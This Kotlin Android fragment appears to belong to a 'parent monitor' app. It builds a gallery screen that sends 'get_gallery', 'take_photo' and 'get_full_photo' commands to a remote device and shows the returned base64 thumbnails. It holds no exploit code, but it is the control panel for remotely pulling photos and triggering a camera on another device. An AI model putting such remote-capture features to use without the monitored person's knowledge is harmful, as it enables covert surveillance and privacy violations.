package com.parent.monitor

import android.app.AlertDialog
import android.graphics.BitmapFactory
import android.os.Bundle
import android.util.Base64
import android.view.*
import android.widget.*
import androidx.fragment.app.Fragment
import org.json.JSONArray
import org.json.JSONObject

class FilesFragment : Fragment() {

    private var tvStatus: TextView? = null
    private var gridView: GridView? = null
    private val items   = mutableListOf<JSONObject>()
    private var adapter: GalleryAdapter? = null

    override fun onCreateView(i: LayoutInflater, c: ViewGroup?, s: Bundle?): View {
        val ctx = requireContext()
        val act = requireActivity() as MainActivity

        val root = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(0xFF060612.toInt())
        }

        val header = LinearLayout(ctx).apply {
            orientation = LinearLayout.HORIZONTAL
            setBackgroundColor(0xFF0A0A1E.toInt())
            setPadding(28, 18, 28, 18)
        }
        val tvTitle = TextView(ctx).apply {
            text = "GALLERY"; textSize = 13f; setTextColor(0xFF00E5FF.toInt())
            layoutParams = LinearLayout.LayoutParams(0, -2, 1f)
        }
        tvStatus = TextView(ctx).apply { text = ""; textSize = 11f; setTextColor(0xFF888888.toInt()) }
        header.addView(tvTitle); header.addView(tvStatus)
        root.addView(header)

        val btnRow = LinearLayout(ctx).apply { orientation = LinearLayout.HORIZONTAL; setPadding(14, 12, 14, 8) }
        val btnFetch = Button(ctx).apply {
            text = "📷 FETCH PHOTOS"; textSize = 12f; setTextColor(0xFF000000.toInt())
            setBackgroundColor(0xFF00E5FF.toInt())
            layoutParams = LinearLayout.LayoutParams(0, -2, 1f).apply { setMargins(0, 0, 8, 0) }
        }
        btnFetch.setOnClickListener { tvStatus?.text = "Fetching…"; act.sendCommand("get_gallery") }
        val btnTakePhoto = Button(ctx).apply {
            text = "📸 SNAP"; textSize = 12f; setTextColor(0xFFFFFFFF.toInt())
            setBackgroundColor(0xFF1A237E.toInt())
            layoutParams = LinearLayout.LayoutParams(-2, -2)
        }
        btnTakePhoto.setOnClickListener { act.sendCommand("take_photo") }
        btnRow.addView(btnFetch); btnRow.addView(btnTakePhoto)
        root.addView(btnRow)

        gridView = GridView(ctx).apply {
            numColumns  = 3
            stretchMode = GridView.STRETCH_COLUMN_WIDTH
            layoutParams = LinearLayout.LayoutParams(-1, 0).apply { weight = 1f }
            setBackgroundColor(0xFF060612.toInt())
        }
        adapter = GalleryAdapter()
        gridView!!.adapter = adapter
        gridView!!.setOnItemClickListener { _, _, pos, _ ->
            val obj = items.getOrNull(pos) ?: return@setOnItemClickListener
            val b64 = obj.optString("thumb", "")
            val uri = obj.optString("path", "")
            if (b64.isNotEmpty()) showImageDialog(b64, uri, act)
        }
        root.addView(gridView)

        (activity as? MainActivity)?.filesFragment = this
        return root
    }

    fun onFiles(arr: JSONArray) {
        items.clear()
        for (k in 0 until arr.length()) {
            val o = arr.optJSONObject(k)
            if (o != null) items.add(o)
        }
        activity?.runOnUiThread {
            tvStatus?.text = "${items.size} photos"
            adapter?.notifyDataSetChanged()
        }
    }

    private fun showImageDialog(thumbB64: String, path: String, act: MainActivity) {
        try {
            val bytes = Base64.decode(thumbB64, Base64.DEFAULT)
            val bmp   = BitmapFactory.decodeByteArray(bytes, 0, bytes.size) ?: return
            val ctx   = requireContext()
            val iv    = ImageView(ctx).apply {
                setImageBitmap(bmp)
                adjustViewBounds = true
                setBackgroundColor(0xFF000000.toInt())
            }
            AlertDialog.Builder(ctx)
                .setView(iv)
                .setPositiveButton("Full Size") { _, _ ->
                    if (path.isNotEmpty()) act.sendCommandObj(
                        org.json.JSONObject().apply { put("command","get_full_photo"); put("path", path) })
                }
                .setNegativeButton("Close", null)
                .show()
        } catch (_: Exception) {}
    }

    inner class GalleryAdapter : BaseAdapter() {
        override fun getCount() = items.size
        override fun getItem(pos: Int) = items[pos]
        override fun getItemId(pos: Int) = pos.toLong()

        override fun getView(pos: Int, convertView: View?, parent: ViewGroup): View {
            val ctx = parent.context
            val iv  = (convertView as? ImageView) ?: ImageView(ctx).apply {
                val cellSz = parent.width / 3
                layoutParams = AbsListView.LayoutParams(cellSz, cellSz)
                scaleType   = ImageView.ScaleType.CENTER_CROP
                setPadding(2, 2, 2, 2)
                setBackgroundColor(0xFF0A0A1E.toInt())
            }
            val obj = items[pos]
            val b64 = obj.optString("thumb", "")
            if (b64.isNotEmpty()) {
                try {
                    val bytes = Base64.decode(b64, Base64.DEFAULT)
                    val bmp   = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                    if (bmp != null) {
                        val oldBmp = (iv.drawable as? android.graphics.drawable.BitmapDrawable)?.bitmap
                        iv.setImageBitmap(bmp)
                        if (oldBmp !== bmp) oldBmp?.recycle()
                        return iv
                    }
                } catch (_: Exception) {}
            }
            iv.setImageDrawable(null)
            iv.setBackgroundColor(0xFF1A1A3E.toInt())
            return iv
        }
    }

    override fun onDestroyView() { (activity as? MainActivity)?.filesFragment = null; super.onDestroyView() }
}
